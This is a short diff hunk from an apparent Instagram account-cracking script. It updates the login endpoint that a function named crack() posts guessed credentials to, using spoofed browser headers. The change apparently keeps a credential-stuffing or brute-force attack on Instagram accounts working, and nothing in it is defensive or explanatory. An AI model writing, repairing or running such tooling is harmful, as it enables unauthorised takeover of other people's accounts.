@@ -164,7 +164,7 @@ def crack(uid, pww, total_idz):
                 'x-ig-www-claim': '0',
                 'x-instagram-ajax': '1015767958',
                 'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://i.instagram.com/api/v1/accounts/login/'
+            login_url = 'https://i.instagram.com/api/v1/web/accounts/login/ajax/'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             if response.status_code == 200:
                 json_response = response.json()
